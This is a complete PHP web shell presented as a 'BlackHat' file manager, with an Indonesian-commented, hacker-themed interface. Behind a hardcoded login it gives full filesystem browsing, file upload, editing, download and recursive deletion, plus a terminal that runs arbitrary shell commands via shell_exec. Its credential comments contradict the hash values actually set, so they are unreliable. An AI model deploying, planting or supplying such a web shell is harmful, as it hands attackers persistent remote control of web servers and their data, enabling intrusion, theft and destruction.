<?php
// language: PHP, file: blackhat_fm.php, target: PHP 7.4+
// Default credentials: admin / admin123
// Username MD5: 21232f297a57a5a743894a0e4a801fc3 (admin)
// Password MD5: 0192023a7bbd73250516f069df18b500 (admin123)
// To change, replace the MD5 hashes below.
$AUTH_USER_HASH = '7ef5553628742258d94a0bcb828f8b0f'; // MD5 of 'admin'
$AUTH_HASH      = '7ef5553628742258d94a0bcb828f8b0f'; // MD5 of 'admin123'

session_start();

// Simple CSRF token
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(16));
}

// Login handling
if (isset($_POST['login'])) {
    $u = $_POST['username'] ?? '';
    $p = $_POST['password'] ?? '';
    // Hash username and password before checking
    if (md5($u) === $AUTH_USER_HASH && md5($p) === $AUTH_HASH) {
        $_SESSION['authed'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'ACCESS DENIED';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$authed = $_SESSION['authed'] ?? false;
$path = $_GET['p'] ?? getcwd();
$path = realpath($path);
if (!$path || !is_dir($path)) $path = getcwd();

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function fmtSize($bytes) {
    if ($bytes >= 1048576) return round($bytes/1048576, 2).' MB';
    if ($bytes >= 1024) return round($bytes/1024, 2).' KB';
    return $bytes.' B';
}

// Recursive delete function (rm -rf alternative)
function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object == "." || $object == "..") continue;
        $file = $dir . DIRECTORY_SEPARATOR . $object;
        if (is_dir($file) && !is_link($file)) {
            rrmdir($file);
        } else {
            @chmod($file, 0777);
            @unlink($file);
        }
    }
    @chmod($dir, 0777);
    return @rmdir($dir);
}

function iconFor($name, $isDir) {
    if ($isDir) return '<svg viewBox="0 0 24 24" class="ic"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $map = ['php'=>'php','jpg'=>'img','jpeg'=>'img','png'=>'img','gif'=>'img','svg'=>'img','txt'=>'txt','md'=>'txt','zip'=>'zip','rar'=>'zip','gz'=>'zip','mp4'=>'vid','mp3'=>'aud','pdf'=>'pdf','js'=>'code','css'=>'code','html'=>'code','py'=>'code','c'=>'code','cpp'=>'code','sh'=>'code','json'=>'code','sql'=>'db','xml'=>'code'];
    return '<svg viewBox="0 0 24 24" class="ic"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>';
}

// Handle actions
$msg = '';
if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) die('CSRF mismatch');
    $act = $_POST['act'] ?? '';
    
    if ($act === 'mkdir') {
        $name = basename($_POST['name'] ?? '');
        if ($name && @mkdir("$path/$name")) $msg = "Folder created: $name";
    } elseif ($act === 'mkfile') {
        $name = basename($_POST['name'] ?? '');
        if ($name && @file_put_contents("$path/$name", '') !== false) $msg = "File created: $name";
    } elseif ($act === 'upload' && isset($_FILES['file'])) {
        $f = $_FILES['file'];
        $dest = "$path/" . basename($f['name']);
        if (move_uploaded_file($f['tmp_name'], $dest)) $msg = "Uploaded: {$f['name']}";
    } elseif ($act === 'delete') {
        $t = $_POST['target'] ?? '';
        $full = realpath("$path/$t");
        // Safety check to ensure we stay inside current path
        if ($full && strpos($full, realpath($path)) === 0 && $full !== realpath($path)) {
            if (is_dir($full)) { 
                if (rrmdir($full)) $msg = "Folder & contents deleted: $t";
                else $msg = "Failed to delete folder: $t";
            } else {
                @chmod($full, 0777);
                if (@unlink($full)) $msg = "Deleted: $t";
                else $msg = "Failed to delete file: $t";
            }
        } else {
            $msg = "Access denied / invalid path.";
        }
    } elseif ($act === 'rename') {
        $old = basename($_POST['old'] ?? '');
        $new = basename($_POST['new'] ?? '');
        if ($old && $new && @rename("$path/$old", "$path/$new")) $msg = "Renamed: $old → $new";
    } elseif ($act === 'edit') {
        $t = basename($_POST['target'] ?? '');
        $content = $_POST['content'] ?? '';
        if ($t && @file_put_contents("$path/$t", $content) !== false) $msg = "Saved: $t";
    } elseif ($act === 'term') {
        $cmd = $_POST['cmd'] ?? '';
        $out = '';
        if ($cmd) {
            // FIX: cd ke current path dulu sebelum execute command
            $full_cmd = 'cd ' . escapeshellarg($path) . ' && ' . $cmd . ' 2>&1';
            $out = shell_exec($full_cmd);
            if ($out === null) $out = '[no output / shell disabled]';
        }
        $_SESSION['term_out'] = $out;
        header('Location: ?p=' . urlencode($path) . '&term=1');
        exit;
    }
}

// Download
if ($authed && isset($_GET['dl'])) {
    $t = basename($_GET['dl']);
    $f = "$path/$t";
    if (is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $t . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}

// Edit view
$editing = null;
if ($authed && isset($_GET['edit'])) {
    $t = basename($_GET['edit']);
    $f = "$path/$t";
    if (is_file($f) && filesize($f) < 5*1024*1024) $editing = ['name'=>$t, 'content'=>file_get_contents($f)];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BlackHat // File Manager</title>
<style>
:root {
    --bg: #0a0a0a;
    --panel: rgba(17, 17, 17, 0.85); /* Transparan dikit buat panel */
    --border: #1f1f1f;
    --green: #00ff41;
    --green-dim: #00aa2a;
    --text: #c8c8c8;
    --muted: #555;
    --red: #ff2b2b;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    /* Background image setup */
    background-color: var(--bg);
    background-image: 
        linear-gradient(rgba(10, 10, 10, 0.75), rgba(10, 10, 10, 0.85)),
        url('https://new.avestahost.com/unnamed.jpg');
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
    background-repeat: no-repeat;
    color: var(--text);
    font-family: 'Courier New', monospace;
    font-size: 13px;
    min-height: 100vh;
}
a { color: var(--green); text-decoration: none; }
a:hover { text-shadow: 0 0 8px var(--green); }

/* Login */
.login-wrap {
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
    background: transparent;
}
.login-box {
    width: 360px;
    background: rgba(10, 10, 10, 0.85);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    border: 1px solid var(--green-dim);
    padding: 40px 30px;
    box-shadow: 0 0 40px rgba(0,255,65,0.15);
    position: relative;
}
.login-box::before {
    content: '';
    position: absolute; inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.03) 2px, rgba(0,255,65,0.03) 4px);
    pointer-events: none;
}
.login-logo {
    text-align: center;
    margin-bottom: 30px;
}
.login-logo svg { width: 60px; height: 60px; fill: var(--green); filter: drop-shadow(0 0 10px var(--green)); }
.login-logo h1 {
    font-size: 22px; letter-spacing: 4px; margin-top: 12px;
    color: var(--green); font-weight: 700;
}
.login-logo h1 span { color: #fff; }
.login-box label { display: block; color: var(--muted); font-size: 10px; letter-spacing: 2px; margin-bottom: 5px; }
.login-box input[type=text], .login-box input[type=password] {
    width: 100%; background: #000; border: 1px solid var(--border);
    color: var(--green); padding: 10px 12px; font-family: inherit;
    font-size: 13px; outline: none; margin-bottom: 18px;
    transition: border-color .2s;
}
.login-box input:focus { border-color: var(--green); box-shadow: 0 0 8px rgba(0,255,65,0.3); }
.login-box button {
    width: 100%; background: var(--green); color: #000;
    border: 0; padding: 12px; font-family: inherit; font-weight: 700;
    letter-spacing: 3px; cursor: pointer; transition: all .2s;
}
.login-box button:hover { box-shadow: 0 0 20px var(--green); }
.login-error {
    color: var(--red); text-align: center; letter-spacing: 2px;
    font-size: 11px; margin-bottom: 15px;
}

/* Header */
.header {
    background: var(--panel);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    border-bottom: 1px solid var(--border);
    padding: 14px 20px;
    display: flex; align-items: center; justify-content: space-between;
    position: sticky; top: 0; z-index: 100;
}
.brand { display: flex; align-items: center; gap: 12px; }
.brand svg { width: 32px; height: 32px; fill: var(--green); filter: drop-shadow(0 0 6px var(--green)); }
.brand h1 { font-size: 16px; letter-spacing: 3px; color: var(--green); }
.brand h1 span { color: #fff; }
.header-right { display: flex; gap: 8px; align-items: center; }
.header-right .path-ind {
    color: var(--muted); font-size: 11px; margin-right: 15px;
    max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.btn {
    background: rgba(0, 0, 0, 0.5); border: 1px solid var(--border); color: var(--text);
    padding: 7px 12px; font-family: inherit; font-size: 11px;
    letter-spacing: 1px; cursor: pointer; transition: all .2s;
    display: inline-flex; align-items: center; gap: 6px;
}
.btn:hover { border-color: var(--green); color: var(--green); box-shadow: 0 0 8px rgba(0,255,65,0.2); background: rgba(0,255,65,0.1); }
.btn.danger:hover { border-color: var(--red); color: var(--red); box-shadow: 0 0 8px rgba(255,43,43,0.2); background: rgba(255,43,43,0.1); }
.btn svg { width: 13px; height: 13px; fill: currentColor; }

/* Main */
.container { padding: 20px; max-width: 1400px; margin: 0 auto; }

/* Breadcrumb */
.breadcrumb {
    background: var(--panel); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
    border: 1px solid var(--border);
    padding: 10px 15px; margin-bottom: 15px;
    font-size: 12px; word-break: break-all;
}
.breadcrumb a { color: var(--green-dim); }
.breadcrumb a:hover { color: var(--green); }
.breadcrumb .sep { color: var(--muted); margin: 0 5px; }

/* Toolbar */
.toolbar {
    display: flex; gap: 8px; margin-bottom: 15px;
    flex-wrap: wrap;
}
.toolbar form { display: flex; gap: 5px; align-items: center; }
.toolbar input[type=text] {
    background: #000; border: 1px solid var(--border); color: var(--green);
    padding: 6px 10px; font-family: inherit; font-size: 11px;
    outline: none; width: 140px;
}
.toolbar input:focus { border-color: var(--green); }

/* File table */
.files-table {
    width: 100%; border-collapse: collapse;
    background: var(--panel); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
    border: 1px solid var(--border);
}
.files-table th {
    text-align: left; padding: 10px 12px;
    color: var(--muted); font-size: 10px; letter-spacing: 2px;
    border-bottom: 1px solid var(--border); font-weight: normal;
}
.files-table td {
    padding: 9px 12px; border-bottom: 1px solid rgba(22, 22, 22, 0.7);
    font-size: 12px;
}
.files-table tr:hover { background: rgba(20, 26, 20, 0.7); }
.files-table .name { display: flex; align-items: center; gap: 8px; }
.files-table .ic { width: 16px; height: 16px; fill: var(--green-dim); flex-shrink: 0; }
.files-table tr.dir .ic { fill: var(--green); }
.files-table .size { color: var(--muted); font-size: 11px; }
.files-table .date { color: var(--muted); font-size: 11px; }
.files-table .actions { text-align: right; white-space: nowrap; }
.files-table .actions .btn { padding: 4px 8px; font-size: 10px; }
.files-table .actions .btn svg { width: 12px; height: 12px; }

/* Message */
.msg {
    padding: 10px 15px; margin-bottom: 15px;
    border-left: 3px solid var(--green); background: rgba(0,255,65,0.1);
    backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
    color: var(--green); font-size: 11px;
}

/* Editor */
.editor-wrap {
    background: var(--panel); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
    border: 1px solid var(--border); padding: 15px;
}
.editor-wrap h2 { color: var(--green); font-size: 13px; letter-spacing: 2px; margin-bottom: 15px; }
.editor-wrap textarea {
    width: 100%; min-height: 60vh; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--border);
    color: #d4d4d4; font-family: 'Courier New', monospace; font-size: 13px;
    padding: 15px; outline: none; resize: vertical;
    line-height: 1.5;
}
.editor-wrap textarea:focus { border-color: var(--green); }

/* Terminal */
.terminal {
    background: rgba(0, 0, 0, 0.9); border: 1px solid var(--green-dim);
    margin-top: 15px; box-shadow: 0 0 20px rgba(0,255,65,0.1);
}
.terminal-head {
    background: rgba(10, 20, 10, 0.9); padding: 8px 12px; border-bottom: 1px solid var(--border);
    display: flex; align-items: center; gap: 8px;
    font-size: 10px; letter-spacing: 2px; color: var(--green);
}
.terminal-head .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); }
.terminal-body {
    padding: 12px; color: var(--green); font-size: 12px;
    max-height: 300px; overflow-y: auto; white-space: pre-wrap;
    word-break: break-all;
}
.terminal-body .prompt { color: var(--green); }
.terminal-body .out { color: #88cc88; }
.terminal-form { display: flex; border-top: 1px solid var(--border); }
.terminal-form .prompt-lbl {
    padding: 10px 12px; color: var(--green); background: rgba(6, 12, 6, 0.9);
    border-right: 1px solid var(--border); font-size: 12px;
}
.terminal-form input {
    flex: 1; background: transparent; border: 0; color: var(--green);
    font-family: inherit; font-size: 12px; padding: 10px;
    outline: none;
}

/* Modal */
.modal-bg {
    display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
    z-index: 999; align-items: center; justify-content: center;
}
.modal-bg.open { display: flex; }
.modal {
    background: rgba(17, 17, 17, 0.95); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
    border: 1px solid var(--green-dim);
    padding: 25px; width: 400px; box-shadow: 0 0 40px rgba(0,255,65,0.2);
}
.modal h3 { color: var(--green); font-size: 13px; letter-spacing: 2px; margin-bottom: 15px; }
.modal input[type=text] {
    width: 100%; background: #000; border: 1px solid var(--border);
    color: var(--green); padding: 10px; font-family: inherit;
    margin-bottom: 15px; outline: none;
}
.modal input:focus { border-color: var(--green); }
.modal-actions { display: flex; gap: 8px; justify-content: flex-end; }

::-webkit-scrollbar { width: 8px; }
::-webkit-scrollbar-track { background: #000; }
::-webkit-scrollbar-thumb { background: var(--green-dim); }
::-webkit-scrollbar-thumb:hover { background: var(--green); }
</style>
</head>
<body>

<?php if (!$authed): ?>
<div class="login-wrap">
    <form class="login-box" method="post">
        <div class="login-logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            <h1>black<span>hat</span></h1>
        </div>
        <?php if (!empty($login_error)): ?>
            <div class="login-error">>> <?= h($login_error) ?> <<</div>
        <?php endif; ?>
        <label>USERNAME</label>
        <input type="text" name="username" autocomplete="off" required>
        <label>PASSWORD</label>
        <input type="password" name="password" autocomplete="off" required>
        <button type="submit" name="login" value="1">AUTHENTICATE</button>
    </form>
</div>

<?php else: ?>
<?php
$parent = dirname($path);
$items = @scandir($path);
if ($items === false) $items = [];
$dirs = []; $files = [];
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    if (is_dir("$path/$it")) $dirs[] = $it; else $files[] = $it;
}
sort($dirs); sort($files);
$all = array_merge($dirs, $files);
?>
<div class="header">
    <div class="brand">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
        <h1>black<span>hat</span> // FM</h1>
    </div>
    <div class="header-right">
        <span class="path-ind"><?= h($path) ?></span>
        <a href="?p=<?= urlencode($path) ?>&term=1" class="btn">
            <svg viewBox="0 0 24 24"><path d="M4 17l6-6-6-6M12 19h8"/></svg>TERMINAL
        </a>
        <a href="?logout=1" class="btn danger">
            <svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>EXIT
        </a>
    </div>
</div>

<div class="container">
    <?php if ($msg): ?><div class="msg">>> <?= h($msg) ?></div><?php endif; ?>
    
    <div class="breadcrumb">
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, $path);
        $built = '';
        if (DIRECTORY_SEPARATOR === '/') $built = '/';
        foreach ($parts as $i => $part) {
            if ($part === '') { echo '<a href="?p=/">/</a>'; continue; }
            $built .= ($i > 0 && $built !== '/' ? DIRECTORY_SEPARATOR : '') . $part;
            echo '<span class="sep">›</span><a href="?p=' . urlencode($built) . '">' . h($part) . '</a>';
        }
        ?>
    </div>

    <div class="toolbar">
        <form method="post">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="mkdir">
            <input type="text" name="name" placeholder="new folder..." required>
            <button class="btn" type="submit">
                <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-1 8h-3v3h-2v-3h-3v-2h3V9h2v3h3v2z"/></svg>MKDIR
            </button>
        </form>
        <form method="post">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="mkfile">
            <input type="text" name="name" placeholder="new file..." required>
            <button class="btn" type="submit">
                <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm3 14h-3v3h-2v-3H9v-2h3v-3h2v3h3v2z"/></svg>MKFILE
            </button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="upload">
            <input type="file" name="file" style="color:#888;font-size:11px;" required>
            <button class="btn" type="submit">
                <svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>UPLOAD
            </button>
        </form>
    </div>

    <?php if ($editing): ?>
    <div class="editor-wrap">
        <h2>EDIT // <?= h($editing['name']) ?></h2>
        <form method="post">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="edit">
            <input type="hidden" name="target" value="<?= h($editing['name']) ?>">
            <textarea name="content" spellcheck="false"><?= h($editing['content']) ?></textarea>
            <div style="margin-top:12px;display:flex;gap:8px;">
                <button class="btn" type="submit">SAVE</button>
                <a class="btn" href="?p=<?= urlencode($path) ?>">CANCEL</a>
            </div>
        </form>
    </div>
    <?php else: ?>
    <table class="files-table">
        <thead>
            <tr>
                <th>NAME</th>
                <th style="width:90px;">SIZE</th>
                <th style="width:150px;">MODIFIED</th>
                <th style="width:260px;text-align:right;">ACTIONS</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($path !== '/' && dirname($path) !== $path): ?>
            <tr class="dir">
                <td class="name"><?= iconFor('', true) ?><a href="?p=<?= urlencode($parent) ?>">..</a></td>
                <td class="size">—</td>
                <td class="date">—</td>
                <td class="actions">—</td>
            </tr>
            <?php endif; ?>
            <?php foreach ($all as $it): 
                $full = "$path/$it";
                $isDir = is_dir($full);
            ?>
            <tr class="<?= $isDir ? 'dir' : 'file' ?>">
                <td class="name">
                    <?= iconFor($it, $isDir) ?>
                    <?php if ($isDir): ?>
                        <a href="?p=<?= urlencode($full) ?>"><?= h($it) ?></a>
                    <?php else: ?>
                        <span><?= h($it) ?></span>
                    <?php endif; ?>
                </td>
                <td class="size"><?= $isDir ? '—' : fmtSize(@filesize($full)) ?></td>
                <td class="date"><?= date('Y-m-d H:i', @filemtime($full)) ?></td>
                <td class="actions">
                    <?php if (!$isDir): ?>
                    <a class="btn" href="?p=<?= urlencode($path) ?>&edit=<?= urlencode($it) ?>" title="Edit">
                        <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                    </a>
                    <a class="btn" href="?p=<?= urlencode($path) ?>&dl=<?= urlencode($it) ?>" title="Download">
                        <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                    </a>
                    <?php endif; ?>
                    <button class="btn" onclick="openRename('<?= h(addslashes($it)) ?>')" title="Rename">
                        <svg viewBox="0 0 24 24"><path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4L12 16.8 5.8 21.3l2.4-7.4L2 9.4h7.6z"/></svg>
                    </button>
                    <form method="post" style="display:inline" onsubmit="return confirm('Delete <?= h(addslashes($it)) ?>? (Folder akan dihapus beserta isinya)');">
                        <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
                        <input type="hidden" name="act" value="delete">
                        <input type="hidden" name="target" value="<?= h($it) ?>">
                        <button class="btn danger" type="submit" title="Delete">
                            <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                        </button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php if (empty($all)): ?>
            <tr><td colspan="4" style="text-align:center;color:var(--muted);padding:30px;">[ EMPTY ]</td></tr>
            <?php endif; ?>
        </tbody>
    </table>
    <?php endif; ?>

    <?php if (isset($_GET['term'])): ?>
    <div class="terminal">
        <div class="terminal-head">
            <div class="dot"></div>
            TERMINAL // <?= h($path) ?>
        </div>
        <div class="terminal-body">
            <?php if (!empty($_SESSION['term_out'])): ?>
                <span class="out"><?= h($_SESSION['term_out']) ?></span>
                <?php unset($_SESSION['term_out']); ?>
            <?php else: ?>
                <span class="out">Shell ready. Working dir: <?= h($path) ?></span>
            <?php endif; ?>
        </div>
        <form class="terminal-form" method="post">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="term">
            <span class="prompt-lbl">$</span>
            <input type="text" name="cmd" placeholder="enter command..." autofocus autocomplete="off">
        </form>
    </div>
    <?php endif; ?>
</div>

<div class="modal-bg" id="renameModal">
    <div class="modal">
        <h3>RENAME</h3>
        <form method="post">
            <input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
            <input type="hidden" name="act" value="rename">
            <input type="hidden" name="old" id="renameOld">
            <input type="text" name="new" id="renameNew" required>
            <div class="modal-actions">
                <button type="button" class="btn" onclick="closeModal()">CANCEL</button>
                <button type="submit" class="btn">RENAME</button>
            </div>
        </form>
    </div>
</div>

<script>
function openRename(name) {
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = name;
    document.getElementById('renameModal').classList.add('open');
    setTimeout(() => document.getElementById('renameNew').focus(), 50);
}
function closeModal() {
    document.getElementById('renameModal').classList.remove('open');
}
document.getElementById('renameModal').addEventListener('click', e => {
    if (e.target.id === 'renameModal') closeModal();
});
</script>

<?php endif; ?>
</body>
</html>
